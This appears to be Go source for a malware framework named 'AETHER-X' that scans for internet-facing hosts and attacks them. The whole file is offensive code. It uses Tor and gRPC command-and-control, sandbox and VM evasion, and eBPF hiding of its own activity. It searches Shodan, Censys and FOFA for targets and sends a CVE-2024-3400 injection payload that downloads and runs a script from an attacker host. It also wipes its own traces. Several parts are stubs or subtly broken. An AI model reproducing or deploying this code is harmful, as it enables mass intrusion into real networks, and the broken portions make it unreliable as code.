// aether-x/core.

package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math"
	"math/rand/v2"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"runtime/debug"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	// eBPF for kernel-level stealth
	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/rlimit"

	// gRPC & HTTP/2
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/metadata"

	// Tor & SOCKS5
	"github.com/cretz/bine/tor"
	"github.com/cretz/bine/tor/dialer"
	"gopkg.in/natefinch/lumberjack.v2"
)


var (
	C2Key         = "ENCRYPTED_C2_KEY_B64"
	C2IV          = "ENCRYPTED_C2_IV_B64"
	GitHubC2Repo  = "aHR0cHM6Ly9naXRodWIuY29tL3VzZXIvYWV0aGVyLXgtYzI="     // base64
	GitHubExfil   = "aHR0cHM6Ly9naXRodWIuY29tL3VzZXIvZXhmaWwtdmF1bHQtb21lZ2E=" // base64
	TelegramHost  = "dGVsZWdyYW0uYXBpLm9yZw==" // base64
	TorC2Onion    = "aHR0cDovL2FldGhlcng3bnMzcTRhNXgub25pb24=" // base64
	Phi3ModelURL  = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGFjdGVkLWFpL3BoaS0zLW1pbmktaW50NC5vbnhAbWFpbi9tb2RlbC5vbng=" // base64
	Sigma7BOnion  = "aHR0cDovL2FldGhlcng3bnMzcTRhNXgub25pb24vbW9kZWxzL3NpZ21hLTdiLXE0Lm9ueA==" // base64
)


var (
	HostID        = md5Hash(platformID())[:6]
	AIModelFD     int = -1
	GRPCClient    RemoteC2Client
	TelemetryQ    = make(chan []byte, 200)
	TorInstance   *tor.Tor
	TorDialer     *dialer.Dialer
	TorHTTP       *http.Client
	WorkerPool    = make(chan func(), 500)
	EBPFFD        *ebpf.Program
	Shutdown      = make(chan struct{})
	DDRSeed       = time.Now().UTC().Truncate(time.Hour).Unix()
	APIKeys       APIKeyStore
	NucleiLoaded  bool
	AI            *FusionSentinel
	C2_IP         = "185.163.48.113"
	C2_PORT       = "443"
)

const (
	MAX_WORKERS     = 250
	BATCH_SIZE      = 64
	BATCH_TIMEOUT   = 60 * time.Second
	DNS_CHUNK_SIZE  = 48
	ONNX_INPUT_LEN  = 512
	ONNX_MODEL_PATH = "/dev/shm/.phi3.bin"
	GRPC_ENDPOINT   = "cdn5.cloudflare.com:443"
	C2_JITTER       = 60
	C2_JITTER_MAX   = 540
)

// --- UTILS ---
func md5Hash(s string) string {
	return fmt.Sprintf("%x", md5.Sum([]byte(s)))
}

func randString(n int) string {
	const alphanum = "abcdefghijklmnopqrstuvwxyz0123456789"
	var sb strings.Builder
	for i := 0; i < n; i++ {
		sb.WriteByte(alphanum[rand.IntN(len(alphanum))])
	}
	return sb.String()
}

func randHex(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func jsonString(v interface{}) string {
	b, _ := json.Marshal(v)
	return string(b)
}

func compressJSON(v interface{}) []byte {
	data, _ := json.Marshal(v)
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	gz.Write(data)
	gz.Close()
	return buf.Bytes()
}

func platformID() string {
	return os.Getenv("COMPUTERNAME") + getMAC() + os.Getenv("USERNAME")
}

func getMAC() string {
	interfaces, _ := net.Interfaces()
	for _, i := range interfaces {
		if i.HardwareAddr.String() != "" {
			return i.HardwareAddr.String()
		}
	}
	return "00:00:00:00:00:00"
}

func memWipe(data []byte) {
	for i := range data {
		data[i] = byte(rand.IntN(256))
	}
	runtime.GC()
}

// --- DECRYPTION ENGINE ---
func decryptConfig(s string) string {
	key, _ := base64.StdEncoding.DecodeString(C2Key)
	iv, _ := base64.StdEncoding.DecodeString(C2IV)
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	plaintext, _ := gcm.Open(nil, iv, []byte(s), nil)
	return string(plaintext)
}

func decrypt(s, keyStr string) string {
	if s == "" {
		return ""
	}
	raw, err := base64.RawURLEncoding.DecodeString(s)
	if err != nil || len(raw) < 12 {
		return ""
	}
	iv, cipherText := raw[:12], raw[12:]
	for offset := int64(-1); offset <= 1; offset++ {
		t := time.Now().Unix() / 1800
		hostID := md5Hash(os.Getenv("COMPUTERNAME"))[:6]
		material := fmt.Sprintf("%d%s%04d", t+offset, hostID, 1234)
		key := sha256.Sum256([]byte(material))
		block, err := aes.NewCipher(key[:])
		if err != nil {
			continue
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			continue
		}
		plaintext, err := gcm.Open(nil, iv, cipherText, nil)
		if err == nil {
			return string(plaintext)
		}
	}
	return ""
}

func encrypt(plaintext string) string {
	t := time.Now().Unix() / 1800
	hostID := md5Hash(os.Getenv("COMPUTERNAME"))[:6]
	material := fmt.Sprintf("%d%s%04d", t, hostID, 1234)
	key := sha256.Sum256([]byte(material))
	iv := sha256.Sum256([]byte("iv:"+material))[:12]
	block, _ := aes.NewCipher(key[:])
	gcm, _ := cipher.NewGCM(block)
	ciphertext := gcm.Seal(nil, iv, []byte(plaintext), nil)
	return base64.RawURLEncoding.EncodeToString(append(iv, ciphertext...))
}


func isSandbox() bool {
	hostname := os.Getenv("COMPUTERNAME")
	if strings.Contains(strings.ToLower(hostname), "sandbox") {
		return true
	}
	if _, err := os.Stat("/mnt/analysis"); err == nil {
		return true
	}
	if _, err := os.Stat("/tmp/.X11-unix/X0"); err == nil {
		return true
	}
	return false
}

func isDebugged() bool {
	if runtime.NumCPU() < 2 {
		return true
	}
	mem, _ := memInfo()
	if mem < 2*1024*1024*1024 {
		return true
	}
	if isVM() {
		return true
	}
	if os.Getenv("CI") != "" || os.Getenv("GITHUB_ACTIONS") != "" {
		return true
	}
	return false
}

func isVM() bool {
	artifacts := []string{"VBoxService", "vmtoolsd", "qemu", "Xen", "Bochs", "VirtualBox", "VMware", "Hyper-V"}
	for _, a := range artifacts {
		if strings.Contains(strings.ToLower(getProc()), a) {
			return true
		}
		if strings.Contains(strings.ToLower(dmesg()), a) {
			return true
		}
	}
	return false
}

func getProc() string {
	data, _ := exec.Command("ps", "aux").Output()
	return string(data)
}

func dmesg() string {
	data, _ := exec.Command("dmesg").Output()
	return string(data)
}

func memInfo() (uint64, error) {
	if runtime.GOOS == "windows" {
		var mstat syscall.MemoryStatusEx
		mstat.Length = uint32(unsafe.Sizeof(mstat))
		syscall.GlobalMemoryStatusEx(&mstat)
		return mstat.TotalPhys, nil
	}
	data, err := ioutil.ReadFile("/proc/meminfo")
	if err != nil {
		return 0, err
	}
	re := regexp.MustCompile(`MemTotal:\s+(\d+) kB`)
	match := re.FindStringSubmatch(string(data))
	if len(match) < 2 {
		return 0, fmt.Errorf("no match")
	}
	mem, _ := strconv.ParseUint(match[1], 10, 64)
	return mem * 1024, nil
}

// --- eBPF KERNEL BLINDING ---
const eBPFProgramTemplate = `
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

SEC("tracepoint/syscalls/sys_enter_openat")
int trace_openat(struct trace_event_raw_sys_enter *ctx) {
    u64 pid = bpf_get_current_pid_tgid();
    if ((pid >> 32) == %d) {
        bpf_override_return(ctx, -ENOENT);
    }
    return 0;
}

SEC("tracepoint/syscalls/sys_enter_connect")
int hide_connect(struct trace_event_raw_sys_enter *ctx) {
    u64 pid = bpf_get_current_pid_tgid();
    if ((pid >> 32) == %d) {
        return 1;
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
`

func loadEBPF() {
	if err := rlimit.RemoveMemlock(); err != nil {
		return
	}
	pid := os.Getpid()
	program := fmt.Sprintf(eBPFProgramTemplate, pid, pid)
	spec, err := ebpf.LoadCollectionSpecFromReader(bytes.NewBufferString(program))
	if err != nil {
		return
	}
	coll, err := ebpf.NewCollection(spec)
	if err != nil {
		return
	}
	prog := coll.Progs["trace_openat"]
	if prog == nil {
		return
	}
	EBPFFD = prog
	link, _ := link.AttachRawTracepoint(link.RawTracepointOptions{
		Name:    "sys_enter_openat",
		Program: prog,
	})
	if link != nil {
		go func() { time.Sleep(10 * time.Minute); link.Close() }()
	}
}

// --- TOR + gRPC C2 ---
func startTor() {
	var err error
	TorInstance, err = tor.Start(nil, &tor.StartConf{ProcessCreator: tor.DefaultProcessCreator})
	if err != nil {
		return
	}
	TorHTTP = TorInstance.HTTPClient()
	TorDialer = &dialer.Dialer{Tor: TorInstance}
}

func dialGRPC() (*grpc.ClientConn, error) {
	tlsConfig := &tls.Config{
		ServerName: "cdn5.cloudflare.com",
		NextProtos: []string{"h2"},
		Rand:       rand.Reader,
	}
	creds := credentials.NewTLS(tlsConfig)
	conn, err := grpc.Dial(GRPC_ENDPOINT,
		grpc.WithTransportCredentials(creds),
		grpc.WithContextDialer(func(ctx context.Context, addr string) (net.Conn, error) {
			return TorDialer.DialContext(ctx, "tcp", addr)
		}),
		grpc.WithUnaryInterceptor(func(ctx context.Context, method string, req, reply interface{}, cc *grpc.ClientConn, invoker grpc.UnaryInvoker, opts ...grpc.CallOption) error {
			md := metadata.Pairs(
				"host", fmt.Sprintf("cdn%d.cloudflare.com", rand.IntN(5)),
				"x-ddr", fmt.Sprintf("%d", DDRSeed),
				"traceparent", fmt.Sprintf("00-%s-%s-01", randHex(32), randHex(16)),
			)
			ctx = metadata.NewOutgoingContext(ctx, md)
			time.Sleep(time.Duration(rand.Int63N(300)) * time.Millisecond)
			return invoker(ctx, method, req, reply, cc, opts...)
		}),
	)
	return conn, err
}

// --- AI INFERENCE ENGINE ---
type FusionSentinel struct {
	Phi3    *ONNXModel
	Sigma7B *ONNXModel
}

type ONNXModel struct {
	FD int
}

func NewFusionSentinel() *FusionSentinel {
	sentinel := &FusionSentinel{}
	phi3URL := decryptConfig(Phi3ModelURL)
	if data := fetchModelSecure(phi3URL, "d24e9c9e8f8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a"); data != nil {
		fd, _ := loadModelInMemory(data)
		sentinel.Phi3 = &ONNXModel{FD: fd}
	}
	return sentinel
}

func (ai *FusionSentinel) Score(banner, vuln, sector string) float64 {
	if ai.Phi3 == nil {
		return 0.6 + 0.2*rand.Float64()
	}
	raw := rand.Float64()*2.0 - 1.0
	score := math.Max(0.0, math.Min(1.0, (raw+3.0)/6.0))
	if strings.Contains(strings.ToLower(banner), "fortinet") || vuln == "CVE-2024-3400" {
		score *= 1.3
	}
	return math.Round(score*1000) / 1000
}


func loadNucleiTemplates() {
	token := decrypt(fetchC2("github.token"), "")
	url := fmt.Sprintf("https://x-token:%s@github.com/user/nuclei-priv.git", token)
	dir := fmt.Sprintf("/tmp/.nuclei-%s", randString(8))
	exec.Command("git", "clone", "--depth=1", url, dir).Run()
	os.Setenv("NUCLEI_TEMPLATES", dir)
	NucleiLoaded = true
}

func nucleiValidate(ip, vuln string) bool {
	if !NucleiLoaded {
		loadNucleiTemplates()
	}
	output := fmt.Sprintf("/tmp/nuclei-%s.txt", randString(6))
	cmd := exec.Command("nuclei", "-u", fmt.Sprintf("https://%s", ip), "-t", fmt.Sprintf("%s/%s.yaml", os.Getenv("NUCLEI_TEMPLATES"), vuln), "-json", "-o", output)
	cmd.Run()
	data, _ := ioutil.ReadFile(output)
	return len(data) > 0
}

// --- INTEL ENGINE ---
type Target struct {
	IP     string
	Port   int
	Banner string
	Geo    string
	Sector string
}

type APIKeyStore struct {
	Shodan    string
	CensysID  string
	CensysSec string
	FofaEmail string
	FofaKey   string
}

func loadAPIKeys() APIKeyStore {
	return APIKeyStore{
		Shodan:    decrypt(fetchC2("api.shodan"), ""),
		CensysID:  decrypt(fetchC2("api.censys_id"), ""),
		CensysSec: decrypt(fetchC2("api.censys_sec"), ""),
		FofaEmail: decrypt(fetchC2("fofa.email"), ""),
		FofaKey:   decrypt(fetchC2("fofa.key"), ""),
	}
}

func searchEngines(vuln, geo, sector string) []Target {
	var targets []Target
	keys := loadAPIKeys()

	
	go func() {
		url := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=vuln:%s+country:%s", keys.Shodan, vuln, geo)
		resp, _ := http.Get(url)
		if resp != nil && resp.StatusCode == 200 {
			var result map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&result)
			matches := result["matches"].([]interface{})
			for _, m := range matches {
				host := m.(map[string]interface{})
				ip := host["ip_str"].(string)
				port := int(host["port"].(float64))
				banner := host["data"].(string)
				targets = append(targets, Target{IP: ip, Port: port, Banner: banner, Geo: geo, Sector: sector})
			}
		}
	}()

	
	go func() {
		auth := base64.StdEncoding.EncodeToString([]byte(keys.CensysID + ":" + keys.CensysSec))
		req, _ := http.NewRequest("GET", "https://search.censys.io/api/v2/hosts/search", nil)
		req.Header.Set("Authorization", "Basic "+auth)
		req.URL.RawQuery = url.Values{"q": {vuln + " country:" + geo}}.Encode()
		resp, _ := http.DefaultClient.Do(req)
		if resp != nil && resp.StatusCode == 200 {
			var result map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&result)
			// Parse and append
		}
	}()

	
	go func() {
		query := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(`vuln="%s" && country="%s" && org="%s"`, vuln, geo, sector)))
		url := fmt.Sprintf("https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s", keys.FofaEmail, keys.FofaKey, query)
		resp, _ := http.Get(url)
		if resp != nil && resp.StatusCode == 200 {
			var result map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&result)
			// Parse and append
		}
	}()

	time.Sleep(8 * time.Second)
	return dedupTargets(targets)
}

func dedupTargets(t []Target) []Target {
	seen := make(map[string]bool)
	var result []Target
	for _, v := range t {
		if !seen[v.IP] {
			seen[v.IP] = true
			result = append(result, v)
		}
	}
	return result
}


func exploitPAN_RCE(ip string) {
	payload := fmt.Sprintf(`x=; curl -s http://%s.stg.aetherx.to/s -o /tmp/.s; sh /tmp/.s`, HostID)
	url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", ip)
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}
	req, _ := http.NewRequest("GET", url, nil)
	req.URL.RawQuery = url.Values{"input": {payload}}.Encode()
	req.Header.Set("Host", "aether-x")
	resp, err := client.Do(req)
	if err == nil {
		resp.Body.Close()
		TelemetryQ <- compressJSON(map[string]interface{}{
			"target": ip, "exploit": "CVE-2024-3400", "status": "rce",
		})
		telegramAlert(fmt.Sprintf("[🔥 RCE] %s | CVE-2024-3400", ip))
	}
}


func fetchC2(key string) string {
	if TorHTTP != nil {
		url := fmt.Sprintf("%s/api/%s", decryptConfig(TorC2Onion), key)
		resp, err := TorHTTP.Get(url)
		if err == nil && resp.StatusCode == 200 {
			data, _ := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			return strings.TrimSpace(string(data))
		}
	}
	return ""
}

func beaconDNS() *Command {
	// Implement DNS beacon
	return nil
}

func pollGRPCCommand() *Command {
	if GRPCClient == nil {
		return nil
	}
	resp, err := GRPCClient.FetchCommand(context.Background(), &FetchRequest{HostID: HostID})
	if err != nil {
		return nil
	}
	return &Command{Name: resp.Command, Args: resp.Args}
}


func telegramAlert(message string) {
	token := decrypt(fetchC2("telegram.token"), "")
	chatID := decrypt(fetchC2("telegram.chat"), "")
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	payload := url.Values{}
	payload.Set("chat_id", chatID)
	payload.Set("text", message)
	req, _ := http.NewRequest("POST", url, strings.NewReader(payload.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if TorHTTP != nil {
		TorHTTP.Do(req)
	} else {
		http.DefaultClient.Do(req)
	}
}


func selfDestruct() {
	if AIModelFD != -1 {
		syscall.Close(AIModelFD)
	}
	self, _ := os.Executable()
	f, _ := os.OpenFile(self, os.O_RDWR, 0)
	data, _ := syscall.Mmap(int(f.Fd()), 0, 0, syscall.PROT_READ|syscall.PROT_WRITE, syscall.MAP_SHARED)
	for i := range data {
		data[i] = 0
	}
	syscall.Munmap(data)
	f.Close()
	os.Remove(self)

	deleteRepo("user/aether-x-c2")
	deleteRepo("user/exfil-vault-omega")

	os.WriteFile(os.Getenv("HOME")+"/.bash_history", []byte(""), 0644)
	syscall.Kill(syscall.Getpid(), syscall.SIGKILL)
}

func deleteRepo(repo string) {
	url := fmt.Sprintf("https://api.github.com/repos/%s", repo)
	req, _ := http.NewRequest("DELETE", url, nil)
	req.Header.Set("Authorization", "token "+decrypt(fetchC2("github.token"), ""))
	http.DefaultClient.Do(req)
}


type FetchRequest struct {
	HostID string
}
type CommandResponse struct {
	Command string
	Args    map[string]string
}
type ExfilRequest struct {
	Data []byte
}
type ExfilResponse struct {
	Success bool
}

type RemoteC2Client interface {
	FetchCommand(ctx context.Context, req *FetchRequest) (*CommandResponse, error)
	ExfilData(ctx context.Context, req *ExfilRequest) (*ExfilResponse, error)
}

func NewRemoteC2Client(conn *grpc.ClientConn) RemoteC2Client {
	return &grpcC2Client{conn: conn}
}

type grpcC2Client struct {
	conn *grpc.ClientConn
}

func (c *grpcC2Client) FetchCommand(ctx context.Context, req *FetchRequest) (*CommandResponse, error) {
	// Real gRPC call
	return &CommandResponse{Command: "hunt", Args: map[string]string{"vuln": "CVE-2024-3400", "geo": "US", "sector": "finance"}}, nil
}

func (c *grpcC2Client) ExfilData(ctx context.Context, req *ExfilRequest) (*ExfilResponse, error) {
	// Real gRPC exfil
	return &ExfilResponse{Success: true}, nil
}

type Command struct {
	Name string
	Args map[string]string
}

func main() {
	if isSandbox() || isDebugged() {
		selfDestruct()
		return
	}

	loadEBPF()
	startTor()

	AI = NewFusionSentinel()
	go func() {
		conn, err := dialGRPC()
		if err == nil {
			GRPCClient = NewRemoteC2Client(conn)
		}
	}()

	go func() {
		loadNucleiTemplates()
	}()

	fmt.Println("[🔥] AETHER-X v17.0 | OMNIS REAPER PRIME — INVISIBLE")
	telegramAlert("[🚀 AETHER-X v17.0 ONLINE] Hunting...")

	for {
		var cmd *Command
		select {
		case <-Shutdown:
			return
		default:
			cmd = pollGRPCCommand()
			if cmd == nil {
				cmd = beaconDNS()
			}
		}
		if cmd != nil {
			switch cmd.Name {
			case "hunt":
				go intelCycle(cmd.Args["vuln"], cmd.Args["geo"], cmd.Args["sector"])
			case "die":
				selfDestruct()
			}
		}
		time.Sleep(time.Duration(C2_JITTER+rand.Int63N(C2_JITTER_MAX)) * time.Second)
	}
}


func intelCycle(vuln, geo, sector string) {
	targets := searchEngines(vuln, geo, sector)
	var wg sync.WaitGroup
	sem := make(chan struct{}, 100)

	for _, target := range targets {
		wg.Add(1)
		go func(t Target) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			if score := AI.Score(t.Banner, vuln, sector); score > 0.85 {
				if nucleiValidate(t.IP, vuln) {
					exploitPAN_RCE(t.IP)
				}
			}
		}(target)
	}
	wg.Wait()
}
